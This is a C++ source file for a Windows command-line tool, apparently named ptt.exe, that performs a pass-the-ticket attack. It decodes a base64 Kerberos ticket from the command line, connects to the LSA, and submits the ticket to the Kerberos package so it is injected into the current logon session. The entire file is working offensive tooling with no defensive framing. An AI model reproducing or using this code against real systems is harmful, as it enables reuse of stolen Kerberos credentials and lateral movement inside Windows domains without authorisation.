#include "stuff.h"

void usage() {
	std::cout << "ptt.exe <b64 ticket>" << std::endl;
}

LSA_STRING* create_lsa_string(const char* value)
{
	char* buf = new char[100];
	LSA_STRING* str = (LSA_STRING*)buf;
	str->Length = strlen(value);
	str->MaximumLength = str->Length;
	str->Buffer = buf + sizeof(LSA_STRING);
	memcpy(str->Buffer, value, str->Length);
	return str;
}

int main(int argc, char** argv) {
	if (argc != 2) {
		usage();
		return 1;
	}

	unsigned int kirbiSize;
	char* ticket = argv[1];
	unsigned char* kirbiTicket = base64_decode(ticket, strlen(ticket), &kirbiSize);
	if (kirbiSize == 0) {
		std::wcout << L"[-] Error converting from b64" << std::endl;
		return 1;
	}
	HANDLE lsa_handle = NULL;
	NTSTATUS status = LsaConnectUntrusted(&lsa_handle);
	if (!NT_SUCCESS(status) || !lsa_handle) {
		std::wcout << L"[-] Error connecting to lsa: " << LsaNtStatusToWinError(status) << std::endl;
		return 1;
	}

	PLSA_STRING lsaString = create_lsa_string("kerberos");

	ULONG authenticationpackage = 0;
	status = LsaLookupAuthenticationPackage(lsa_handle, lsaString, &authenticationpackage);
	if (authenticationpackage == 0) {
		std::wcout << L"[-] Error LsaLookupAP: " << LsaNtStatusToWinError(status) << std::endl;
		return 1;
	}
	std::wcout << L"[?] Package id " << authenticationpackage << std::endl;

	NTSTATUS packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;

	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
	if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize))
	{
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = kirbiSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, kirbiTicket, pKerbSubmit->KerbCredSize);
		status = LsaCallAuthenticationPackage(lsa_handle, authenticationpackage, pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if (NT_SUCCESS(status))
		{
			if (NT_SUCCESS(packageStatus))
			{
				std::wcout << L"[+] Injected\n" << std::endl;
				status = 0x0;
			}
			else if (LsaNtStatusToWinError(packageStatus) == 1398) {
				std::wcout << L"[!!!!] ERROR_TIME_SKEW between KDC and host computer" << std::endl;
			}
			else std::wcout << L"[-] KerbSubmitTicketMessage / Package :" << LsaNtStatusToWinError(packageStatus) << "\n";
		}
		else std::wcout << L"[-] KerbSubmitTicketMessage :" << LsaNtStatusToWinError(status) << "\n";
	}
	LsaDeregisterLogonProcess(lsa_handle);

	return 0;
}